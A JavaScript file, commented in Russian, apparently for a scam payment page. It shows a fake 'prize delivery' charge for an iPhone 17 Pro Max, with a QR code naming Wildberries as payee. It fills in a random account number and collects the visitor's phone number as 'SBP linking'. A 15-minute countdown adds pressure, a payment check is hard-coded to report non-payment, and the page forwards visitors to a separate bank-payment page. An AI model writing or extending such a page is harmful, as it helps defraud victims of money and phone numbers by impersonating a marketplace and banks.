// Получение данных из URL параметров
const urlParams = new URLSearchParams(window.location.search);
const name = urlParams.get('name') || 'Иванов Иван Иванович';
const phone = urlParams.get('phone') || '+7 (999) 123-45-67';
const amount = urlParams.get('amount') || '1500';

// Генерация случайного СБП номера (формат: 13 цифр)
function generateSbpNumber() {
    // СБП номер начинается с 2 и содержит 13 цифр
    let sbpNumber = '2';
    for (let i = 0; i < 12; i++) {
        sbpNumber += Math.floor(Math.random() * 10);
    }
    return sbpNumber;
}

// Генерируем и сохраняем СБП номер
const sbpNumber = generateSbpNumber();

// Названия банков
const bankNames = {
    'sber': 'Сбербанк',
    'vtb': 'ВТБ',
    'tinkoff': 'Тинькофф',
    'alfa': 'Альфа-Банк',
    'raiffeisen': 'Райффайзенбанк',
    'gazprombank': 'Газпромбанк',
    'rosbank': 'Росбанк',
    'other': 'Другой банк'
};

// Выбранный банк
let selectedBank = null;

// Установка данных на странице
document.getElementById('recipientName').textContent = name;
document.getElementById('amountValue').textContent = parseInt(amount).toLocaleString('ru-RU');
document.getElementById('sbpNumber').textContent = sbpNumber;

// Обработка выбора банка
const bankCards = document.querySelectorAll('.bank-card');
const bankSelection = document.getElementById('bankSelection');
const sbpLinkForm = document.getElementById('sbpLinkForm');
const paymentMethods = document.getElementById('paymentMethods');
const selectedBankName = document.getElementById('selectedBankName');
const previewBankName = document.getElementById('previewBankName');

bankCards.forEach(card => {
    card.addEventListener('click', function() {
        // Убираем выделение с других карточек
        bankCards.forEach(c => c.classList.remove('selected'));
        
        // Выделяем выбранную карточку
        this.classList.add('selected');
        
        // Сохраняем выбранный банк
        selectedBank = this.dataset.bank;
        const bankName = bankNames[selectedBank] || 'Банк';
        selectedBankName.textContent = bankName;
        previewBankName.textContent = bankName;
        
        // Анимация перехода к форме привязки
        setTimeout(() => {
            bankSelection.classList.add('hidden');
            sbpLinkForm.classList.remove('hidden');
        }, 300);
    });
});

// Форматирование номера телефона в форме привязки
const linkPhoneInput = document.getElementById('linkPhone');
linkPhoneInput.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    
    if (value.startsWith('8')) {
        value = '7' + value.slice(1);
    }
    
    if (value.startsWith('7')) {
        value = value.slice(0, 11);
        let formatted = '+7';
        
        if (value.length > 1) {
            formatted += ' (' + value.slice(1, 4);
        }
        if (value.length >= 4) {
            formatted += ') ' + value.slice(4, 7);
        }
        if (value.length >= 7) {
            formatted += '-' + value.slice(7, 9);
        }
        if (value.length >= 9) {
            formatted += '-' + value.slice(9, 11);
        }
        
        e.target.value = formatted;
    } else if (value.length > 0 && !value.startsWith('7') && !value.startsWith('8')) {
        e.target.value = '+7 (' + value.slice(0, 3);
    }
});

// Обработка формы привязки СБП счета
const linkForm = document.getElementById('linkForm');
linkForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const linkPhone = linkPhoneInput.value.trim();
    const phoneDigits = linkPhone.replace(/\D/g, '');
    
    // Валидация
    if (!linkPhone || phoneDigits.length !== 11 || !phoneDigits.startsWith('7')) {
        linkPhoneInput.style.borderColor = '#f5576c';
        showNotification('Введите корректный номер телефона', 'error');
        return;
    }
    
    const submitBtn = linkForm.querySelector('.link-submit-btn');
    const btnText = submitBtn.querySelector('.btn-text');
    const originalText = btnText.textContent;
    
    submitBtn.disabled = true;
    btnText.textContent = 'Привязка...';
    
    // Имитация привязки счета
    setTimeout(() => {
        // В реальном проекте здесь будет запрос к API для привязки счета
        console.log('Привязка СБП счета:', {
            bank: selectedBank,
            phone: linkPhone
        });
        
        // Переход к методам оплаты
        sbpLinkForm.classList.add('hidden');
        paymentMethods.classList.remove('hidden');
        
        // Показываем дополнительные элементы
        const timer = document.querySelector('.payment-timer');
        const info = document.querySelector('.payment-info');
        const actions = document.querySelector('.payment-actions');
        const help = document.querySelector('.payment-help');
        
        if (timer) timer.classList.remove('hidden');
        if (info) info.classList.remove('hidden');
        if (actions) actions.classList.remove('hidden');
        if (help) help.classList.remove('hidden');
        
        // Запускаем таймер после привязки
        if (typeof startTimer === 'function') {
            startTimer();
        }
        
        // Генерируем QR-код после привязки
        setTimeout(generateQRCode, 300);
        
        showNotification('СБП счет успешно привязан!', 'success');
    }, 2000);
});

// Генерация QR-кода для СБП
function generateQRCode() {
    const qrLoader = document.getElementById('qrLoader');
    const qrCode = document.getElementById('qrCode');
    
    // Формируем строку для СБП (формат: ST00012|Name=Wildberries|PersonalAcc=...|Sum=...)
    // Используем сгенерированный СБП номер
    const sbpString = `ST00012|Name=Wildberries|PersonalAcc=${sbpNumber}|Sum=${amount}00|Purpose=Оплата доставки iPhone 17 Pro Max`;
    
    // Генерируем QR-код
    QRCode.toCanvas(qrCode, sbpString, {
        width: 280,
        margin: 2,
        color: {
            dark: '#1a1a2e',
            light: '#ffffff'
        },
        errorCorrectionLevel: 'M'
    }, function (error) {
        if (error) {
            console.error('Ошибка генерации QR-кода:', error);
            qrLoader.innerHTML = '<p style="color: #f5576c;">Ошибка генерации QR-кода</p>';
            return;
        }
        
        // Скрываем загрузчик
        qrLoader.style.display = 'none';
        
        // Добавляем анимацию появления
        qrCode.style.opacity = '0';
        qrCode.style.transform = 'scale(0.9)';
        setTimeout(() => {
            qrCode.style.transition = 'all 0.5s cubic-bezier(0.16, 1, 0.3, 1)';
            qrCode.style.opacity = '1';
            qrCode.style.transform = 'scale(1)';
        }, 100);
    });
}

// Копирование СБП номера
const copySbpBtn = document.getElementById('copySbpBtn');
copySbpBtn.addEventListener('click', function() {
    navigator.clipboard.writeText(sbpNumber).then(() => {
        const originalText = this.querySelector('span').textContent;
        this.querySelector('span').textContent = 'Скопировано!';
        this.style.background = 'rgba(76, 175, 80, 0.1)';
        this.style.borderColor = '#4caf50';
        this.style.color = '#4caf50';
        
        setTimeout(() => {
            this.querySelector('span').textContent = originalText;
            this.style.background = '';
            this.style.borderColor = '';
            this.style.color = '';
        }, 2000);
    }).catch(err => {
        console.error('Ошибка копирования:', err);
        showNotification('Не удалось скопировать СБП номер', 'error');
    });
});

// Переход на страницу оплаты банка
const sbpPayBtn = document.getElementById('sbpPayBtn');
if (sbpPayBtn) {
    sbpPayBtn.addEventListener('click', function() {
        // Формируем URL для перехода на страницу банка
        const bankParams = new URLSearchParams({
            sbp: sbpNumber,
            amount: amount,
            bank: selectedBank || 'sber'
        });
        
        window.location.href = `bank-payment.html?${bankParams.toString()}`;
    });
}

// Таймер обратного отсчета
let timeLeft = 15 * 60; // 15 минут в секундах
const timerDisplay = document.getElementById('timerDisplay');
let timerInterval = null;

function startTimer() {
    if (timerInterval) return; // Таймер уже запущен
    
    function updateTimer() {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
        
        if (timeLeft <= 0) {
            timerDisplay.textContent = '00:00';
            showNotification('Время на оплату истекло', 'error');
            if (timerInterval) {
                clearInterval(timerInterval);
                timerInterval = null;
            }
            return;
        }
        
        timeLeft--;
        
        // Меняем цвет при малом времени
        if (timeLeft <= 60) {
            timerDisplay.style.color = '#f5576c';
            timerDisplay.style.animation = 'pulse 1s ease-in-out infinite';
        }
    }
    
    // Обновляем таймер каждую секунду
    timerInterval = setInterval(updateTimer, 1000);
    updateTimer();
}

// Проверка оплаты
const checkPaymentBtn = document.getElementById('checkPaymentBtn');
let checkAttempts = 0;

checkPaymentBtn.addEventListener('click', function() {
    checkAttempts++;
    const btnText = this.querySelector('span');
    const originalText = btnText.textContent;
    
    this.disabled = true;
    btnText.textContent = 'Проверка...';
    
    // Имитация проверки оплаты
    setTimeout(() => {
        // В реальном проекте здесь будет запрос к серверу для проверки статуса оплаты
        const isPaid = false; // Замените на реальную проверку
        
        if (isPaid) {
            showNotification('Оплата подтверждена! Ваш приз будет отправлен в ближайшее время.', 'success');
            // Перенаправление на страницу успеха
            // window.location.href = 'success.html';
        } else {
            if (checkAttempts >= 3) {
                showNotification('Оплата еще не поступила. Пожалуйста, проверьте правильность перевода или попробуйте позже.', 'error');
            } else {
                showNotification('Оплата еще не поступила. Попробуйте еще раз через несколько секунд.', 'error');
            }
        }
        
        btnText.textContent = originalText;
        this.disabled = false;
    }, 2000);
});

// Функция показа уведомлений
function showNotification(message, type = 'info') {
    const existing = document.querySelector('.notification');
    if (existing) {
        existing.remove();
    }
    
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.innerHTML = `
        <div class="notification-content">
            <span class="notification-icon">${type === 'success' ? '✓' : type === 'error' ? '✕' : 'ℹ'}</span>
            <span class="notification-message">${message}</span>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.style.opacity = '1';
        notification.style.transform = 'translateY(0)';
    }, 10);
    
    setTimeout(() => {
        notification.style.opacity = '0';
        notification.style.transform = 'translateY(-20px)';
        setTimeout(() => {
            notification.remove();
        }, 300);
    }, type === 'error' ? 5000 : 4000);
}

// Добавляем стили для уведомлений
const style = document.createElement('style');
style.textContent = `
    .notification {
        position: fixed;
        top: 20px;
        right: 20px;
        background: white;
        border-radius: 12px;
        padding: 16px 20px;
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
        z-index: 10000;
        opacity: 0;
        transform: translateY(-20px);
        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        max-width: 400px;
        border-left: 4px solid;
    }
    
    .notification-success {
        border-left-color: #4ecdc4;
    }
    
    .notification-error {
        border-left-color: #f5576c;
    }
    
    .notification-info {
        border-left-color: #667eea;
    }
    
    .notification-content {
        display: flex;
        align-items: center;
        gap: 12px;
    }
    
    .notification-icon {
        font-size: 20px;
        font-weight: bold;
        width: 24px;
        height: 24px;
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 50%;
        flex-shrink: 0;
    }
    
    .notification-success .notification-icon {
        background: #4ecdc4;
        color: white;
    }
    
    .notification-error .notification-icon {
        background: #f5576c;
        color: white;
    }
    
    .notification-info .notification-icon {
        background: #667eea;
        color: white;
    }
    
    .notification-message {
        font-size: 14px;
        line-height: 1.5;
        color: #333;
    }
    
    @media (max-width: 480px) {
        .notification {
            right: 12px;
            left: 12px;
            max-width: none;
        }
    }
`;
document.head.appendChild(style);

// Анимация появления элементов при загрузке страницы
window.addEventListener('load', function() {
    // Анимация карточек банков
    const bankCards = document.querySelectorAll('.bank-card');
    bankCards.forEach((card, index) => {
        card.style.opacity = '0';
        card.style.transform = 'translateY(20px) scale(0.95)';
        setTimeout(() => {
            card.style.transition = 'all 0.5s cubic-bezier(0.16, 1, 0.3, 1)';
            card.style.opacity = '1';
            card.style.transform = 'translateY(0) scale(1)';
        }, index * 50 + 200);
    });
    
    // Анимация элементов оплаты (когда они появятся)
    const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            if (mutation.target.classList.contains('payment-methods') && !mutation.target.classList.contains('hidden')) {
                const elements = mutation.target.querySelectorAll('.method-content, .sbp-payment, .selected-bank-info');
                elements.forEach((el, index) => {
                    el.style.opacity = '0';
                    el.style.transform = 'translateY(20px)';
                    setTimeout(() => {
                        el.style.transition = 'all 0.6s cubic-bezier(0.16, 1, 0.3, 1)';
                        el.style.opacity = '1';
                        el.style.transform = 'translateY(0)';
                    }, index * 100);
                });
                observer.disconnect();
            }
        });
    });
    
    observer.observe(paymentMethods, { attributes: true, attributeFilter: ['class'] });
});

